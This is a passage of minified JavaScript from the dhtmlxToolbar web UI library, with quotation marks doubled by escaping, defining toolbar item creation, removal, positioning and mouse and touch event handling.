dhxtoolbar_btn_def"";h.obj.className=h.obj.renderAs;h.arw.className=String(h.obj.renderAs).replace(""btn"",""arw"");a.anyUsed=""none"";window.dhx4.zim.clear(h.polygon._idd);h.polygon.style.display=""none"";if(h.polygon._ie6cover){h.polygon._ie6cover.style.display=""none""}if(a.conf.skin==""dhx_terrace""){a._improveTerraceButtonSelect(h.id,true)}}}}})}};if(window.dhx4.isIPad){document.addEventListener(""touchstart"",this._doOnClick,false)}else{if(typeof(window.addEventListener)!=""undefined""){window.addEventListener(""mousedown"",this._doOnClick,false)}else{document.body.attachEvent(""onmousedown"",this._doOnClick)}}if(this.conf.icons_size_autoload!=null){this.setIconSize(this.conf.icons_size_autoload);this.conf.icons_size_autoload=null}if(this.conf.items_autoload!=null){this.loadStruct(this.conf.items_autoload,this.conf.onload_autoload);this.conf.items_autoload=null}else{if(this.conf.json_autoload!=null){this.loadStruct(this.conf.json_autoload,this.conf.onload_autoload);this.conf.json_autoload=null}else{if(this.conf.xml_autoload!=null){this.loadStruct(this.conf.xml_autoload,this.conf.onload_autoload);this.conf.xml_autoload=null}}}if(this.conf.align_autostart!=this.conf.align){this.setAlign(this.conf.align_autostart);this.conf.align_autostart=null}if(typeof(this.conf.auto_onclick)==""function""){this.attachEvent(""onClick"",this.conf.auto_onclick)}else{if(typeof(this.conf.auto_onclick)==""string""&&typeof(window[this.conf.auto_onclick])==""function""){this.attachEvent(""onClick"",window[this.conf.auto_onclick])}}return this}dhtmlXToolbarObject.prototype.addSpacer=function(e){var c=this.idPrefix+e;if(this._spacer!=null){if(this._spacer.idd==e){return}if(this._spacer==this.objPull[c].obj.parentNode){var a=true;while(a){var m=this._spacer.childNodes[0].idd;this.base.appendChild(this._spacer.childNodes[0]);if(m==e||this._spacer.childNodes.length==0){if(this.objPull[c].arw!=null){this.base.appendChild(this.objPull[c].arw)}a=false}}this._spacer.idd=e;this._fixSpacer();return}if(this.base==this.objPull[c].obj.parentNode){var a=true;var l=(this.objPull[c].arw!=null);while(a){var g=this.base.childNodes.length-1;if(l==true){if(this.base.childNodes[g]==this.objPull[c].arw){a=false}}if(this.base.childNodes[g].idd==e){a=false}if(a){if(this._spacer.childNodes.length>0){this._spacer.insertBefore(this.base.childNodes[g],this._spacer.childNodes[0])}else{this._spacer.appendChild(this.base.childNodes[g])}}}this._spacer.idd=e;this._fixSpacer();return}}else{var h=null;for(var g=0;g<this.base.childNodes.length;g++){if(this.base.childNodes[g]==this.objPull[this.idPrefix+e].obj){h=g;if(this.objPull[this.idPrefix+e].arw!=null){h=g+1}}}if(h!=null){this._spacer=document.createElement(""DIV"");this._spacer.className=(this.conf.align==""right""?"" dhxtoolbar_float_left"":"" dhxtoolbar_float_right"");this._spacer.dir=""ltr"";this._spacer.idd=e;while(this.base.childNodes.length>h+1){this._spacer.appendChild(this.base.childNodes[h+1])}this.cont.appendChild(this._spacer);this._fixSpacer()}}if(this.conf.skin==""dhx_terrace""){this._improveTerraceSkin()}};dhtmlXToolbarObject.prototype.removeSpacer=function(){if(!this._spacer){return}while(this._spacer.childNodes.length>0){this.base.appendChild(this._spacer.childNodes[0])}this._spacer.parentNode.removeChild(this._spacer);this._spacer=null;if(this.conf.skin==""dhx_terrace""){this._improveTerraceSkin()}};dhtmlXToolbarObject.prototype._fixSpacer=function(){if(typeof(window.addEventListener)==""undefined""&&this._spacer!=null){this._spacer.style.borderLeft=""1px solid #a4bed4"";var a=this._spacer;window.setTimeout(function(){a.style.borderLeft=""0px solid #a4bed4"";a=null},1)}};dhtmlXToolbarObject.prototype.getType=function(e){var g=this.getParentId(e);if(g!=null){var c=null;var a=this.objPull[this.idPrefix+g]._listOptions[e];if(a!=null){if(a.sep!=null){c=""buttonSelectSeparator""}else{c=""buttonSelectButton""}}return c}else{if(this.objPull[this.idPrefix+e]==null){return null}return this.objPull[this.idPrefix+e][""type""]}};dhtmlXToolbarObject.prototype.getTypeExt=function(c){var a=this.getType(c);if(a==""buttonSelectButton""||a==""buttonSelectSeparator""){if(a==""buttonSelectButton""){a=""button""}else{a=""separator""}return a}return null};dhtmlXToolbarObject.prototype.inArray=function(e,c){for(var a=0;a<e.length;a++){if(e[a]==c){return true}}return false};dhtmlXToolbarObject.prototype.getParentId=function(g){var h=null;for(var e in this.objPull){if(this.objPull[e]._listOptions){for(var c in this.objPull[e]._listOptions){if(c==g){h=String(e).replace(this.idPrefix,"""")}}}}return h};dhtmlXToolbarObject.prototype._addItem=function(a,c){if(typeof(a.text)==""string""){a.text=window.dhx4.trim(a.text);if(a.text.length==0){a.text=null}}this._addItemToStorage(a,c);if(this.conf.skin==""dhx_terrace""){this._improveTerraceSkin()}};dhtmlXToolbarObject.prototype.addButton=function(h,g,c,a,e){this._addItem({id:h,type:""button"",text:c,img:a,imgdis:e},g)};dhtmlXToolbarObject.prototype.addText=function(e,c,a){this._addItem({id:e,type:""text"",text:a},c)};dhtmlXToolbarObject.prototype.addButtonSelect=function(g,n,s,a,c,o,m,w,h,l){var v=[];for(var e=0;e<a.length;e++){var r={};if(a[e] instanceof Array){r.id=a[e][0];r.type=(a[e][1]==""obj""?""button"":""separator"");r.text=(a[e][2]||null);r.img=(a[e][3]||null)}else{if(a[e] instanceof Object&&a[e]!=null&&typeof(a[e].id)!=""undefined""&&typeof(a[e].type)!=""undefined""){r.id=a[e].id;r.type=(a[e].type==""obj""?""button"":""separator"");r.text=a[e].text;r.img=a[e].img}}v.push(r)}this._addItem({id:g,type:""buttonSelect"",text:s,img:c,imgdis:o,renderSelect:m,openAll:w,options:v,maxOpen:h,mode:l},n)};dhtmlXToolbarObject.prototype.addButtonTwoState=function(h,g,c,a,e){this._addItem({id:h,type:""buttonTwoState"",img:a,imgdis:e,text:c},g)};dhtmlXToolbarObject.prototype.addSeparator=function(c,a){this._addItem({id:c,type:""separator""},a)};dhtmlXToolbarObject.prototype.addSlider=function(c,m,h,g,o,e,l,a,n){this._addItem({id:c,type:""slider"",length:h,valueMin:g,valueMax:o,valueNow:e,textMin:l,textMax:a,toolTip:n},m)};dhtmlXToolbarObject.prototype.addInput=function(g,e,c,a){this._addItem({id:g,type:""buttonInput"",value:c,width:a},e)};dhtmlXToolbarObject.prototype.forEachItem=function(e){for(var c in this.objPull){if(this.inArray(this.rootTypes,this.objPull[c][""type""])){e(this.objPull[c][""id""].replace(this.idPrefix,""""))}}};(function(){var l=""isVisible,enableItem,disableItem,isEnabled,setItemText,getItemText,setItemToolTip,getItemToolTip,getInput,setItemImage,setItemImageDis,clearItemImage,clearItemImageDis,setItemState,getItemState,setItemToolTipTemplate,getItemToolTipTemplate,setValue,getValue,setMinValue,getMinValue,setMaxValue,getMaxValue,setWidth,getWidth,setMaxOpen"".split("","");var e=[false,"""","""",false,"""","""","""","""","""","""","""","""","""",false,"""","""","""",null,"""",[null,null],"""",[null,null],"""",null];var c=function(m,n){return function(r,q,o){r=this.idPrefix+r;if(this.objPull[r][m]!=null){return this.objPull[r][m].call(this.objPull[r],q,o)}else{return n}}};for(var h=0;h<l.length;h++){var a=l[h];var g=e[h];dhtmlXToolbarObject.prototype[a]=c(a,g)}})();dhtmlXToolbarObject.prototype.showItem=function(a){a=this.idPrefix+a;if(this.objPull[a]!=null&&this.objPull[a].showItem!=null){this.objPull[a].showItem();if(this.conf.skin==""dhx_terrace""){this._improveTerraceSkin()}}};dhtmlXToolbarObject.prototype.hideItem=function(a){a=this.idPrefix+a;if(this.objPull[a]!=null&&this.objPull[a].hideItem!=null){this.objPull[a].hideItem();if(this.conf.skin==""dhx_terrace""){this._improveTerraceSkin()}}};dhtmlXToolbarObject.prototype.getPosition=function(a){return this._getPosition(a)};dhtmlXToolbarObject.prototype._getPosition=function(h,e){if(this.objPull[this.idPrefix+h]==null){return null}var g=null;var a=0;for(var c=0;c<this.base.childNodes.length;c++){if(this.base.childNodes[c].idd!=null){if(this.base.childNodes[c].idd==h){g=a}a++}}if(!g&&this._spacer!=null){for(var c=0;c<this._spacer.childNodes.length;c++){if(this._spacer.childNodes[c].idd!=null){if(this._spacer.childNodes[c].idd==h){g=a}a++}}}return g};dhtmlXToolbarObject.prototype.setPosition=function(a,c){this._setPosition(a,c)};dhtmlXToolbarObject.prototype._setPosition=function(h,g){if(this.objPull[this.idPrefix+h]==null){return}if(isNaN(g)){g=this.base.childNodes.length}if(g<0){g=0}var a=null;if(this._spacer){a=this._spacer.idd;this.removeSpacer()}var e=this.objPull[this.idPrefix+h];this.base.removeChild(e.obj);if(e.arw){this.base.removeChild(e.arw)}var c=this._getIdByPosition(g,true);if(c[0]==null){this.base.appendChild(e.obj);if(e.arw){this.base.appendChild(e.arw)}}else{this.base.insertBefore(e.obj,this.base.childNodes[c[1]]);if(e.arw){this.base.insertBefore(e.arw,this.base.childNodes[c[1]+1])}}if(a!=null){this.addSpacer(a)}};dhtmlXToolbarObject.prototype._getIdByPosition=function(l,c){var h=null;var a=0;var e=0;for(var g=0;g<this.base.childNodes.length;g++){if(this.base.childNodes[g][""idd""]!=null&&h==null){if((a++)==l){h=this.base.childNodes[g][""idd""]}}if(h==null){e++}}e=(h==null?null:e);return(c==true?new Array(h,e):h)};dhtmlXToolbarObject.prototype.removeItem=function(a){this._removeItem(a);if(this.conf.skin==""dhx_terrace""){this._improveTerraceSkin()}};dhtmlXToolbarObject.prototype._removeItem=function(h){var e=this.getType(h);h=this.idPrefix+h;var g=this.objPull[h];if(e==""button""){g.obj._doOnMouseOver=null;g.obj._doOnMouseOut=null;g.obj._doOnMouseUp=null;g.obj._doOnMouseUpOnceAnywhere=null;g.obj.onclick=null;g.obj.onmouseover=null;g.obj.onmouseout=null;g.obj.onmouseup=null;g.obj.onmousedown=null;g.obj.onselectstart=null;g.obj.renderAs=null;g.obj.idd=null;g.obj.parentNode.removeChild(g.obj);g.obj=null;g.id=null;g.state=null;g.img=null;g.imgEn=null;g.imgDis=null;g.type=null;g.enableItem=null;g.disableItem=null;g.isEnabled=null;g.showItem=null;g.hideItem=null;g.isVisible=null;g.setItemText=null;g.getItemText=null;g.setItemImage=null;g.clearItemImage=null;g.setItemImageDis=null;g.clearItemImageDis=null;g.setItemToolTip=null;g.getItemToolTip=null}if(e==""buttonTwoState""){g.obj._doOnMouseOver=null;g.obj._doOnMouseOut=null;g.obj.onmouseover=null;g.obj.onmouseout=null;g.obj.onmousedown=null;g.obj.onselectstart=null;g.obj.renderAs=null;g.obj.idd=null;g.obj.parentNode.removeChild(g.obj);g.obj=null;g.id=null;g.state=null;g.img=null;g.imgEn=null;g.imgDis=null;g.type=null;g.enableItem=null;g.disableItem=null;g.isEnabled=null;g.showItem=null;g.hideItem=null;g.isVisible=null;g.setItemText=null;g.getItemText=null;g.setItemImage=null;g.clearItemImage=null;g.setItemImageDis=null;g.clearItemImageDis=null;g.setItemToolTip=null;g.getItemToolTip=null;g.setItemState=null;g.getItemState=null}if(e==""buttonSelect""){for(var c in g._listOptions){this.removeListOption(h,c)}g._listOptions=null;if(g.polygon._ie6cover){document.body.removeChild(g.polygon._ie6cover);g.polygon._ie6cover=null}g.p_tbl.removeChild(g.p_tbody);g.polygon.removeChild(g.p_tbl);g.polygon.onselectstart=null;document.body.removeChild(g.polygon);g.p_tbody=null;g.p_tbl=null;g.polygon=null;g.obj.onclick=null;g.obj.onmouseover=null;g.obj.onmouseout=null;g.obj.onmouseup=null;g.obj.onmousedown=null;g.obj.onselectstart=null;g.obj.idd=null;g.obj.iddPrefix=null;g.obj.parentNode.removeChild(g.obj);g.obj=null;g.arw.onclick=null;g.arw.onmouseover=null;g.arw.onmouseout=null;g.arw.onmouseup=null;g.arw.onmousedown=null;g.arw.onselectstart=null;g.arw.parentNode.removeChild(g.arw);g.arw=null;g.renderSelect=null;g.state=null;g.type=null;g.id=null;g.img=null;g.imgEn=null;g.imgDis=null;g.openAll=null;g._isListButton=null;g._separatorButtonSelectObject=null;g._buttonButtonSelectObject=null;g.setWidth=null;g.enableItem=null;g.disableItem=null;g.isEnabled=null;g.showItem=null;g.hideItem=null;g.isVisible=null;g.setItemText=null;g.getItemText=null;g.setItemImage=null;g.clearItemImage=null;g.setItemImageDis=null;g.clearItemImageDis=null;g.setItemToolTip=null;g.getItemToolTip=null;g.addListOption=null;g.removeListOption=null;g.showListOption=null;g.hideListOption=null;g.isListOptionVisible=null;g.enableListOption=null;g.disableListOption=null;g.isListOptionEnabled=null;g.setListOptionPosition=null;g.getListOptionPosition=null;g.setListOptionImage=null;g.getListOptionImage=null;g.clearListOptionImage=null;g.setListOptionText=null;g.getListOptionText=null;g.setListOptionToolTip=null;g.getListOptionToolTip=null;g.forEachListOption=null;g.getAllListOptions=null;g.setListOptionSelected=null;g.getListOptionSelected=null}if(e==""buttonInput""){g.obj.childNodes[0].onkeydown=null;g.obj.removeChild(g.obj.childNodes[0]);g.obj.w=null;g.obj.idd=null;g.obj.parentNode.removeChild(g.obj);g.obj=null;g.id=null;g.type=null;g.enableItem=null;g.disableItem=null;g.isEnabled=null;g.showItem=null;g.hideItem=null;g.isVisible=null;g.setItemToolTip=null;g.getItemToolTip=null;g.setWidth=null;g.getWidth=null;g.setValue=null;g.getValue=null;g.setItemText=null;g.getItemText=null}if(e==""slider""){if(window.dhx4.isIPad){document.removeEventListener(""touchmove"",pen._doOnMouseMoveStart,false);document.removeEventListener(""touchend"",pen._doOnMouseMoveEnd,false)}else{if(typeof(window.addEventListener)==""function""){window.removeEventListener(""mousemove"",g.pen._doOnMouseMoveStart,false);window.removeEventListener(""mouseup"",g.pen._doOnMouseMoveEnd,false)}else{document.body.detachEvent(""onmousemove"",g.pen._doOnMouseMoveStart);document.body.detachEvent(""onmouseup"",g.pen._doOnMouseMoveEnd)}}g.pen.allowMove=null;g.pen.initXY=null;g.pen.maxX=null;g.pen.minX=null;g.pen.nowX=null;g.pen.newNowX=null;g.pen.valueMax=null;g.pen.valueMin=null;g.pen.valueNow=null;g.pen._definePos=null;g.pen._detectLimits=null;g.pen._doOnMouseMoveStart=null;g.pen._doOnMouseMoveEnd=null;g.pen.onmousedown=null;g.obj.removeChild(g.pen);g.pen=null;g.label.tip=null;document.body.removeChild(g.label);g.label=null;g.obj.onselectstart=null;g.obj.idd=null;while(g.obj.childNodes.length>0){g.obj.removeChild(g.obj.childNodes[0])}g.obj.parentNode.removeChild(g.obj);g.obj=null;g.id=null;g.type=null;g.state=null;g.enableItem=null;g.disableItem=null;g.isEnabled=null;g.setItemToolTipTemplate=null;g.getItemToolTipTemplate=null;g.setMaxValue=null;g.setMinValue=null;g.getMaxValue=null;g.getMinValue=null;g.setValue=null;g.getValue=null;g.showItem=null;g.hideItem=null;g.isVisible=null}if(e==""separator""){g.obj.onselectstart=null;g.obj.idd=null;g.obj.parentNode.removeChild(g.obj);g.obj=null;g.id=null;g.type=null;g.showItem=null;g.hideItem=null;g.isVisible=null}if(e==""text""){g.obj.onselectstart=null;g.obj.idd=null;g.obj.parentNode.removeChild(g.obj);g.obj=null;g.id=null;g.type=null;g.showItem=null;g.hideItem=null;g.isVisible=null;g.setWidth=null;g.setItemText=null;g.getItemText=null}e=null;g=null;this.objPull[this.idPrefix+h]=null;delete this.objPull[this.idPrefix+h]};(function(){var g=""addListOption,removeListOption,showListOption,hideListOption,isListOptionVisible,enableListOption,disableListOption,isListOptionEnabled,setListOptionPosition,getListOptionPosition,setListOptionText,getListOptionText,setListOptionToolTip,getListOptionToolTip,setListOptionImage,getListOptionImage,clearListOptionImage,forEachListOption,getAllListOptions,setListOptionSelected,getListOptionSelected"".split("","");var c=function(h){return function(r,m,l,q,o,n){r=this.idPrefix+r;if(this.objPull[r]==null){return}if(this.objPull[r][""type""]!=""buttonSelect""){return}return this.objPull[r][h].call(this.objPull[r],m,l,q,o,n)}};for(var e=0;e<g.length;e++){var a=g[e];dhtmlXToolbarObject.prototype[a]=c(a)}})();dhtmlXToolbarObject.prototype._rtlParseBtn=function(c,a){return c+a};dhtmlXToolbarObject.prototype._separatorObject=function(a,e,c){this.id=a.idPrefix+e;this.obj=document.createElement(""DIV"");this.obj.className=""dhx_toolbar_sep"";this.obj.style.display=(c.hidden!=null?""none"":"""");this.obj.idd=String(e);this.obj.title=(c.title||"""");this.obj.onselectstart=function(g){g=g||event;if(g.preventDefault){g.preventDefault()}else{g.returnValue=false}};if(window.dhx4.isIPad){this.obj.ontouchstart=function(g){g=g||event;if(g.preventDefault){g.preventDefault()}else{g.returnValue=false}g.cancelBubble=true;return false}}a.base.appendChild(this.obj);this.showItem=function(){this.obj.style.display=""""};this.hideItem=function(){this.obj.style.display=""none""};this.isVisible=function(){return(this.obj.style.display=="""")};return this};dhtmlXToolbarObject.prototype._textObject=function(a,e,c){this.id=a.idPrefix+e;this.obj=document.createElement(""DIV"");this.obj.className=""dhx_toolbar_text"";this.obj.style.display=(c.hidden!=null?""none"":"""");this.obj.idd=String(e);this.obj.title=(c.title||"""");this.obj.onselectstart=function(g){g=g||event;if(g.preventDefault){g.preventDefault()}else{g.returnValue=false}};if(window.dhx4.isIPad){this.obj.ontouchstart=function(g){g=g||event;if(g.preventDefault){g.preventDefault()}else{g.returnValue=false}g.cancelBubble=true;return false}}this.obj.innerHTML=(c.text||"""");a.base.appendChild(this.obj);this.showItem=function(){this.obj.style.display=""""};this.hideItem=function(){this.obj.style.display=""none""};this.isVisible=function(){return(this.obj.style.display=="""")};this.setItemText=function(g){this.obj.innerHTML=g};this.getItemText=function(){return this.obj.innerHTML};this.setWidth=function(g){this.obj.style.width=g+""px""};this.setItemToolTip=function(g){this.obj.title=g};this.getItemToolTip=function(){return this.obj.title};return this};dhtmlXToolbarObject.prototype._buttonObject=function(a,g,c){this.id=a.idPrefix+g;this.state=(c.enabled!=null?false:true);this.imgEn=(c.img||"""");this.imgDis=(c.imgdis||"""");this.img=(this.state?(this.imgEn!=""""?this.imgEn:""""):(this.imgDis!=""""?this.imgDis:""""));this.obj=document.createElement(""DIV"");this.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_""+(this.state?""def"":""dis"");this.obj.style.display=(c.hidden!=null?""none"":"""");this.obj.allowClick=false;this.obj.extAction=(c.action||null);this.obj.renderAs=this.obj.className;this.obj.idd=String(g);this.obj.title=(c.title||"""");this.obj.pressed=false;this.obj.innerHTML=a._rtlParseBtn((this.img!=""""?""<img src='""+a.conf.icons_path+this.img+""'>"":""""),(c.text!=null?""<div class='dhxtoolbar_text'>""+c.text+""</div>"":""""));var e=this;this.obj.onselectstart=function(h){h=h||event;if(h.preventDefault){h.preventDefault()}else{h.returnValue=false}};this.obj.onmouseover=function(){this._doOnMouseOver()};this.obj.onmouseout=function(){this._doOnMouseOut()};this.obj._doOnMouseOver=function(){this.allowClick=true;if(e.state==false){return}if(a.anyUsed!=""none""){return}this.className=""dhx_toolbar_btn dhxtoolbar_btn_over"";this.renderAs=this.className};this.obj._doOnMouseOut=function(){this.allowClick=false;if(e.state==false){return}if(a.anyUsed!=""none""){return}this.className=""dhx_toolbar_btn dhxtoolbar_btn_def"";this.renderAs=this.renderAs};this.obj.onclick=function(h){if(e.state==false){return}if(this.allowClick==false){return}h=h||event;var l=this.idd.replace(a.idPrefix,"""");if(this.extAction){try{window[this.extAction](l)}catch(h){}}if(a&&a.callEvent){a.callEvent(""onClick"",[l])}};this.obj[window.dhx4.isIPad?""ontouchstart"":""onmousedown""]=function(h){if(e.state==false){h=h||event;if(h.preventDefault){h.preventDefault()}else{h.returnValue=false}h.cancelBubble=true;return false}if(a.anyUsed!=""none""){return}a.anyUsed=this.idd;this.className=""dhx_toolbar_btn dhxtoolbar_btn_pres"";this.pressed=true;this.onmouseover=function(){this._doOnMouseOver()};this.onmouseout=function(){a.anyUsed=""none"";this._doOnMouseOut()};return false};this.obj[window.dhx4.isIPad?""ontouchend"":""onmouseup""]=function(l){if(e.state==false){return}if(a.anyUsed!=""none""){if(a.anyUsed!=this.idd){return}}var h=a.anyUsed;this._doOnMouseUp();if(window.dhx4.isIPad&&h!=""none""){a.callEvent(""onClick"",[this.idd.replace(a.idPrefix,"""")])}};if(window.dhx4.isIPad){this.obj.ontouchmove=function(h){this._doOnMouseUp()}}this.obj._doOnMouseUp=function(){a.anyUsed=""none"";this.className=this.renderAs;this.pressed=false};this.obj._doOnMouseUpOnceAnywhere=function(){this._doOnMouseUp();this.onmouseover=function(){this._doOnMouseOver()};this.onmouseout=function(){this._doOnMouseOut()}};a.base.appendChild(this.obj);this.enableItem=function(){a._enableItem(this)};this.disableItem=function(){a._disableItem(this)};this.isEnabled=function(){return this.state};this.showItem=function(){this.obj.style.display=""""};this.hideItem=function(){this.obj.style.display=""none""};this.isVisible=function(){return(this.obj.style.display=="""")};this.setItemText=function(h){a._setItemText(this,h)};this.getItemText=function(){return a._getItemText(this)};this.setItemImage=function(h){a._setItemImage(this,h,true)};this.clearItemImage=function(){a._clearItemImage(this,true)};this.setItemImageDis=function(h){a._setItemImage(this,h,false)};this.clearItemImageDis=function(){a._clearItemImage(this,false)};this.setItemToolTip=function(h){this.obj.title=h};this.getItemToolTip=function(){return this.obj.title};return this};dhtmlXToolbarObject.prototype._buttonSelectObject=function(e,l,h){this.id=e.idPrefix+l;this.state=(h.enabled!=null?(h.enabled==""true""?true:false):true);this.imgEn=(h.img||"""");this.imgDis=(h.imgdis||"""");this.img=(this.state?(this.imgEn!=""""?this.imgEn:""""):(this.imgDis!=""""?this.imgDis:""""));this.mode=(h.mode||""button"");if(this.mode==""select""){this.openAll=true;this.renderSelect=false;if(!h.text||h.text.length==0){h.text=""&nbsp;""}}else{this.openAll=(window.dhx4.s2b(h.openAll)==true);this.renderSelect=(h.renderSelect==null?true:window.dhx4.s2b(h.renderSelect))}this.maxOpen=(!isNaN(h.maxOpen?h.maxOpen:"""")?h.maxOpen:null);this._maxOpenTest=function(){if(!isNaN(this.maxOpen)){if(!e._sbw){var n=document.createElement(""DIV"");n.className=""dhxtoolbar_maxopen_test"";document.body.appendChild(n);var m=document.createElement(""DIV"");m.className=""dhxtoolbar_maxopen_test2"";n.appendChild(m);e._sbw=n.offsetWidth-m.offsetWidth;n.removeChild(m);m=null;document.body.removeChild(n);n=null}}};this._maxOpenTest();this.obj=document.createElement(""DIV"");this.obj.allowClick=false;this.obj.extAction=(h.action||null);this.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_""+(this.state?""def"":""dis"");this.obj.style.display=(h.hidden!=null?""none"":"""");this.obj.renderAs=this.obj.className;this.obj.onselectstart=function(m){m=m||event;if(m.preventDefault){m.preventDefault()}else{m.returnValue=false}};this.obj.idd=String(l);this.obj.title=(h.title||"""");this.obj.pressed=false;this.callEvent=false;this.obj.innerHTML=e._rtlParseBtn((this.img!=""""?""<img src='""+e.conf.icons_path+this.img+""'>"":""""),(h.text!=null?""<div class='dhxtoolbar_text'>""+h.text+""</div>"":""""));e.base.appendChild(this.obj);this.arw=document.createElement(""DIV"");this.arw.className=""dhx_toolbar_arw dhxtoolbar_btn_""+(this.state?""def"":""dis"");this.arw.style.display=this.obj.style.display;this.arw.innerHTML=""<div class='arwimg'>&nbsp;</div>"";this.arw.title=this.obj.title;this.arw.onselectstart=function(m){m=m||event;if(m.preventDefault){m.preventDefault()}else{m.returnValue=false}};e.base.appendChild(this.arw);var a=this;this.obj.onmouseover=function(m){m=m||event;if(e.anyUsed!=""none""){return}if(!a.state){return}a.obj.renderAs=""dhx_toolbar_btn dhxtoolbar_btn_over"";a.obj.className=a.obj.renderAs;a.arw.className=String(a.obj.renderAs).replace(""btn"",""arw"")};this.obj.onmouseout=function(){a.obj.allowClick=false;if(e.anyUsed!=""none""){return}if(!a.state){return}a.obj.renderAs=""dhx_toolbar_btn dhxtoolbar_btn_def"";a.obj.className=a.obj.renderAs;a.arw.className=String(a.obj.renderAs).replace(""btn"",""arw"");a.callEvent=false};this.arw.onmouseover=this.obj.onmouseover;this.arw.onmouseout=this.obj.onmouseout;if(this.openAll==true){}else{this.obj.onclick=function(m){m=m||event;if(!a.obj.allowClick){return}if(!a.state){return}if(e.anyUsed!=""none""){return}var n=a.obj.idd.replace(e.idPrefix,"""");if(a.obj.extAction){try{window[a.obj.extAction](n)}catch(m){}}e.callEvent(""onClick"",[n])};this.obj[window.dhx4.isIPad?""ontouchstart"":""onmousedown""]=function(m){m=m||event;if(e.anyUsed!=""none""){return}if(!a.state){return}a.obj.allowClick=true;a.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_pres"";a.arw.className=""dhx_toolbar_arw dhxtoolbar_btn_pres"";a.callEvent=true};this.obj[window.dhx4.isIPad?""ontouchend"":""onmouseup""]=function(m){m=m||event;m.cancelBubble=true;if(e.anyUsed!=""none""){return}if(!a.state){return}a.obj.className=a.obj.renderAs;a.arw.className=String(a.obj.renderAs).replace(""btn"",""arw"");if(window.dhx4.isIPad&&a.callEvent){var n=a.obj.idd.replace(e.idPrefix,"""");e.callEvent(""onClick"",[n])}}}if(window.dhx4.isIPad){this.obj.ontouchmove=this.obj.onmouseout}this.arw[window.dhx4.isIPad?""ontouchstart"":""onmousedown""]=function(o){o=o||event;var w=(this.className.indexOf(""dhx_toolbar_arw"")===0?this:this.nextSibling);if(w._skip){o=o||event;o.cancelBubble=true}else{w._skip=true}w=null;if(!a.state){return}if(e.anyUsed==a.obj.idd){a.obj.className=a.obj.renderAs;a.arw.className=String(a.obj.renderAs).replace(""btn"",""arw"");e.anyUsed=""none"";window.dhx4.zim.clear(a.polygon._idd);a.polygon.style.display=""none"";if(a.polygon._ie6cover){a.polygon._ie6cover.style.display=""none""}if(e.conf.skin==""dhx_terrace""){e._improveTerraceButtonSelect(a.id,true)}}else{if(e.anyUsed!=""none""){if(e.objPull[e.idPrefix+e.anyUsed][""type""]==""buttonSelect""){var v=e.objPull[e.idPrefix+e.anyUsed];if(v.polygon.style.display!=""none""){v.obj.renderAs=""dhx_toolbar_btn dhxtoolbar_btn_def"";v.obj.className=v.obj.renderAs;v.arw.className=String(a.obj.renderAs).replace(""btn"",""arw"");window.dhx4.zim.clear(v.polygon._idd);v.polygon.style.display=""none"";if(v.polygon._ie6cover){v.polygon._ie6cover.style.display=""none""}if(e.conf.skin==""dhx_terrace""){e._improveTerraceButtonSelect(v.id,true)}}}}a.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_over"";a.arw.className=""dhx_toolbar_arw dhxtoolbar_btn_pres"";e.anyUsed=a.obj.idd;a.polygon.style.top=""0px"";a.polygon.style.visibility=""hidden"";a.polygon.style.zIndex=window.dhx4.zim.reserve(a.polygon._idd);a.polygon.style.display="""";if(e.conf.skin==""dhx_terrace""){e._improveTerraceButtonSelect(a.id,false)}a._fixMaxOpenHeight(a.maxOpen||null);e._autoDetectVisibleArea();var q=window.dhx4.absTop(a.obj)+a.obj.offsetHeight+e.conf.sel_ofs_y;var s=a.polygon.offsetHeight;if(q+s>e.tY2){var r=(a.maxOpen!=null?Math.floor((e.tY2-q)/22):0);if(r>=1){a._fixMaxOpenHeight(r)}else{q=window.dhx4.absTop(a.obj)-s-e.conf.sel_ofs_y;if(q<0){q=0}}}a.polygon.style.top=q+""px"";if(e.rtl){a.polygon.style.left=window.dhx4.absLeft(a.obj)+a.obj.offsetWidth-a.polygon.offsetWidth+e.conf.sel_ofs_x+""px""}else{var n=document.body.scrollLeft;var m=n+(window.innerWidth||document.body.clientWidth);var u=window.dhx4.absLeft(a.obj)+e.conf.sel_ofs_x;if(u+a.polygon.offsetWidth>m){u=window.dhx4.absLeft(a.arw)+a.arw.offsetWidth-a.polygon.offsetWidth}a.polygon.style.left=Math.max(u,5)+""px""}a.polygon.style.visibility=""visible"";if(a.polygon._ie6cover){a.polygon._ie6cover.style.left=a.polygon.style.left;a.polygon._ie6cover.style.top=a.polygon.style.top;a.polygon._ie6cover.style.width=a.polygon.offsetWidth+""px"";a.polygon._ie6cover.style.height=a.polygon.offsetHeight+""px"";a.polygon._ie6cover.style.display=""""}}return false};this.arw.onclick=function(m){m=m||event;m.cancelBubble=true};this.arw[window.dhx4.isIPad?""ontouchend"":""onmouseup""]=function(m){m=m||event;m.cancelBubble=true};if(this.openAll===true){this.obj.onclick=this.arw.onclick;this.obj.onmousedown=this.arw.onmousedown;this.obj.onmouseup=this.arw.onmouseup;if(window.dhx4.isIPad){this.obj.ontouchstart=this.arw.ontouchstart;this.obj.ontouchend=this.arw.ontouchend}}this.obj.iddPrefix=e.idPrefix;this._listOptions={};this._fixMaxOpenHeight=function(r){var q=""auto"";var o=false;if(r!==null){var n=0;for(var m in this._listOptions){n++}if(n>r){this._ph=22*r;q=this._ph+""px""}else{o=true}}this.polygon.style.width=""auto"";this.polygon.style.height=""auto"";if(!o&&a.maxOpen!=null){this.polygon.style.width=this.p_tbl.offsetWidth+e._sbw+""px"";this.polygon.style.height=q}};this._separatorButtonSelectObject=function(o,m,n){this.obj={};this.obj.tr=document.createElement(""TR"");this.obj.tr.className=""tr_sep"";this.obj.tr.onselectstart=function(q){q=q||event;if(q.preventDefault){q.preventDefault()}else{q.returnValue=false}return false};this.obj.td=document.createElement(""TD"");this.obj.td.colSpan=""2"";this.obj.td.className=""td_btn_sep"";this.obj.td.onselectstart=function(q){q=q||event;if(q.preventDefault){q.preventDefault()}else{q.returnValue=false}return false};if(isNaN(n)){n=a.p_tbody.childNodes.length+1}else{if(n<1){n=1}}if(n>a.p_tbody.childNodes.length){a.p_tbody.appendChild(this.obj.tr)}else{a.p_tbody.insertBefore(this.obj.tr,a.p_tbody.childNodes[n-1])}this.obj.tr.appendChild(this.obj.td);this.obj.sep=document.createElement(""DIV"");this.obj.sep.className=""btn_sep"";this.obj.sep.onselectstart=function(q){q=q||event;if(q.preventDefault){q.preventDefault()}else{q.returnValue=false}return false};this.obj.td.appendChild(this.obj.sep);a._listOptions[o]=this.obj;return 